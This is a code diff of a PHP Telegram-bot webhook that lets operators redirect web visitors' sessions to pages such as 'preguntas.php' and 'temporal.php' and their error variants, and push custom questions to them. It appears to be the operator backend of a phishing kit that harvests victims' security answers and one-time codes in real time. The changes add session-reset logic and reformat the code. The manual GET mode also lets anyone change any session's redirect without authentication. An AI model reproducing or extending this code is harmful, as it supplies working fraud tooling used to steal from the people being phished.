@@ -6,16 +6,34 @@ ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
 error_reporting(0);
 
+// 🔧 FIX 1: Configuración de sesiones ANTES de cualquier operación
+ini_set('session.save_handler', 'files');
+ini_set('session.use_strict_mode', 0);
+ini_set('session.use_cookies', 0);
+ini_set('session.use_only_cookies', 0);
+ini_set('session.cache_limiter', '');
+
 // === 1. MODO MANUAL ===
 if (isset($_GET['session_id']) && isset($_GET['page'])) {
     $session_id = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['session_id']);
     $page = basename($_GET['page']);
 
-    session_write_close();
+    // 🔧 FIX 2: Limpiar cualquier sesión activa completamente
+    if (session_status() === PHP_SESSION_ACTIVE) {
+        session_unset();
+        session_destroy();
+        session_write_close();
+    }
+    
+    // Pequeña pausa para asegurar liberación
+    usleep(100000); // 0.1 segundos
+    
     session_id($session_id);
     session_start();
+    
     $_SESSION['redirect'] = $page;
     $_SESSION['redirect_set_time'] = time();
+    
     session_write_close();
 
     echo json_encode(['status' => 'success', 'message' => "Redirigiendo a $page"]);
@@ -26,7 +44,7 @@ if (isset($_GET['session_id']) && isset($_GET['page'])) {
 $input = file_get_contents("php://input");
 $update = json_decode($input, true);
 
-// ✅ Detectar qué bot recibió el webhook
+// Detectar qué bot recibió el webhook
 $current_bot_token = null;
 
 $current_chat_id =
@@ -35,9 +53,7 @@ $current_chat_id =
     ?? null;
 
 if ($current_chat_id) {
-
     foreach ($telegram_accounts as $account) {
-
         if ($account['chat_id'] == $current_chat_id) {
             $current_bot_token = $account['token'];
             break;
@@ -59,7 +75,6 @@ if (isset($update['callback_query'])) {
         $parts = explode(":", $callback_data);
 
         if (count($parts) === 3) {
-
             $session_id = preg_replace('/[^a-zA-Z0-9]/', '', $parts[1]);
             $redirect_page = basename($parts[2]);
 
@@ -77,91 +92,76 @@ if (isset($update['callback_query'])) {
                 exit;
             }
 
-            session_write_close();
+            // 🔧 FIX 3: Limpiar sesión anterior antes de cambiar ID
+            if (session_status() === PHP_SESSION_ACTIVE) {
+                session_unset();
+                session_destroy();
+                session_write_close();
+            }
+            
+            usleep(100000); // 0.1 segundos de espera
+            
             session_id($session_id);
             session_start();
 
-            // ✅ Mantener el mismo ID
-            if (
-                in_array(
-                    $redirect_page,
-                    [
-                        'preguntas.php',
-                        'preguntas-error.php',
-                        'temporal.php',
-                        'temporal-error.php'
-                    ]
-                )
-            ) {
+            // Mantener el mismo ID
+            if (in_array($redirect_page, ['preguntas.php', 'preguntas-error.php', 'temporal.php', 'temporal-error.php'])) {
                 $_SESSION['redirect'] = $redirect_page . "?id=" . $session_id;
             } else {
                 $_SESSION['redirect'] = $redirect_page;
             }
 
             $_SESSION['redirect_set_time'] = time();
-
+            
             session_write_close();
 
-            answerCallbackQuery(
-                $callback_query['id'],
-                "✅ Redirigiendo a $redirect_page"
-            );
+            answerCallbackQuery($callback_query['id'], "✅ Redirigiendo a $redirect_page");
         }
     }
 
     // --- Personalizar Preguntas
     if (strpos($callback_data, 'custom:') === 0) {
-
-        $session_id = preg_replace(
-            '/[^a-zA-Z0-9]/',
-            '',
-            explode(":", $callback_data)[1]
-        );
-
+        $session_id = preg_replace('/[^a-zA-Z0-9]/', '', explode(":", $callback_data)[1]);
         $file = __DIR__ . "/requests/$session_id.json";
 
         // Cargar datos existentes
-        $data = file_exists($file)
-            ? json_decode(file_get_contents($file), true)
-            : [];
+        $data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
 
         $data['step'] = 'awaiting_q1';
         $data['chat_id'] = $chat_id;
 
         // Enviar mensaje
-        $sent = sendTelegramMessage(
-            $chat_id,
-            "✍️ *Escribe la primera pregunta personalizada:*"
-        );
+        $sent = sendTelegramMessage($chat_id, "✍️ *Escribe la primera pregunta personalizada:*");
 
         if (isset($sent['result']['message_id'])) {
             $data['msg_q1'] = $sent['result']['message_id'];
         }
 
-        file_put_contents(
-            $file,
-            json_encode($data, JSON_UNESCAPED_UNICODE)
-        );
+        file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE));
 
-        session_write_close();
+        // 🔧 FIX 4: Limpiar antes de cambiar sesión
+        if (session_status() === PHP_SESSION_ACTIVE) {
+            session_unset();
+            session_destroy();
+            session_write_close();
+        }
+        
+        usleep(100000);
+        
         session_id($session_id);
         session_start();
 
         $_SESSION['redirect'] = "preguntas.php?id=$session_id";
         $_SESSION['wait_for_questions'] = true;
-
+        
         session_write_close();
 
-        answerCallbackQuery(
-            $callback_query['id'],
-            "Redirigiendo a preguntas.php..."
-        );
+        answerCallbackQuery($callback_query['id'], "Redirigiendo a preguntas.php...");
     }
 }
 
 // === 3. RESPUESTAS A PREGUNTAS PERSONALIZADAS ===
 if (isset($update['message']['text'])) {
-
     $chat_id = $update['message']['chat']['id'];
     $text = trim($update['message']['text']);
     $message_id = $update['message']['message_id'];
@@ -169,31 +169,21 @@ if (isset($update['message']['text'])) {
     // Borrar mensajes del propio bot
     $from = $update['message']['from'];
 
-    if (
-        isset($from['is_bot']) &&
-        $from['is_bot'] === true &&
-        isset($from['username']) &&
-        strtolower($from['username']) === '@cid_bot'
-    ) {
+    if (isset($from['is_bot']) && $from['is_bot'] === true && isset($from['username']) && strtolower($from['username']) === '@cid_bot') {
         deleteMessage($chat_id, $message_id);
         exit;
     }
 
     foreach (glob(__DIR__ . "/requests/*.json") as $file) {
-
         $data = json_decode(file_get_contents($file), true);
 
-        if (
-            !isset($data['chat_id']) ||
-            $data['chat_id'] != $chat_id
-        ) {
+        if (!isset($data['chat_id']) || $data['chat_id'] != $chat_id) {
             continue;
         }
 
         $session_id = basename($file, ".json");
 
         if (($data['step'] ?? '') === 'awaiting_q1') {
-
             $data['question1'] = $text;
             $data['step'] = 'awaiting_q2';
 
@@ -204,38 +194,41 @@ if (isset($update['message']['text'])) {
             }
 
             // Pregunta 2
-            $sent = sendTelegramMessage(
-                $chat_id,
-                "✍️ *Ahora escribe la segunda pregunta personalizada:*"
-            );
+            $sent = sendTelegramMessage($chat_id, "✍️ *Ahora escribe la segunda pregunta personalizada:*");
 
             if (isset($sent['result']['message_id'])) {
                 $data['msg_q2'] = $sent['result']['message_id'];
             }
 
-            file_put_contents(
-                $file,
-                json_encode($data, JSON_UNESCAPED_UNICODE)
-            );
+            file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE));
 
             break;
 
         } elseif (($data['step'] ?? '') === 'awaiting_q2') {
-
             $data['question2'] = $text;
-
             unset($data['step']);
-
             $data['redirect'] = 'preguntas.php';
 
-            session_write_close();
+            // 🔧 FIX 5: Limpiar completamente antes de escribir en sesión
+            if (session_status() === PHP_SESSION_ACTIVE) {
+                session_unset();
+                session_destroy();
+                session_write_close();
+            }
+            
+            usleep(100000);
+            
             session_id($session_id);
             session_start();
 
             $_SESSION['redirect'] = "preguntas.php?id=$session_id";
             $_SESSION['redirect_set_time'] = time();
-
+            
             session_write_close();
+
+            // Limpiar después de escribir
+            session_unset();
+            session_destroy();
 
             // Borrar mensaje anterior
             if (!empty($data['msg_q2'])) {
@@ -243,15 +236,9 @@ if (isset($update['message']['text'])) {
                 unset($data['msg_q2']);
             }
 
-            file_put_contents(
-                $file,
-                json_encode($data, JSON_UNESCAPED_UNICODE)
-            );
+            file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE));
 
-            sendTelegramMessage(
-                $chat_id,
-                "✅ Preguntas guardadas y usuario redirigido."
-            );
+            sendTelegramMessage($chat_id, "✅ Preguntas guardadas y usuario redirigido.");
 
             break;
         }
@@ -261,61 +248,44 @@ if (isset($update['message']['text'])) {
 // === FUNCIONES ===
 
 function sendTelegramMessage($chat_id, $text) {
-
     global $current_bot_token;
-
     $url = "https://api.telegram.org/bot$current_bot_token/sendMessage";
-
     $data = [
         'chat_id' => $chat_id,
         'text' => $text,
         'parse_mode' => 'Markdown'
     ];
-
     return sendTelegramRequest($url, $data);
 }
 
 function answerCallbackQuery($callback_id, $text) {
-
     global $current_bot_token;
-
     $url = "https://api.telegram.org/bot$current_bot_token/answerCallbackQuery";
-
     $data = [
         'callback_query_id' => $callback_id,
         'text' => $text,
         'show_alert' => false
     ];
-
     sendTelegramRequest($url, $data);
 }
 
 function deleteMessage($chat_id, $message_id) {
-
     global $current_bot_token;
-
     $url = "https://api.telegram.org/bot$current_bot_token/deleteMessage";
-
     $data = [
         'chat_id' => $chat_id,
         'message_id' => $message_id
     ];
-
     sendTelegramRequest($url, $data);
 }
 
 function sendTelegramRequest($url, $data) {
-
     $ch = curl_init($url);
-
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-
     $resp = @curl_exec($ch);
-
     curl_close($ch);
-
     return json_decode($resp, true);
 }
 ?>
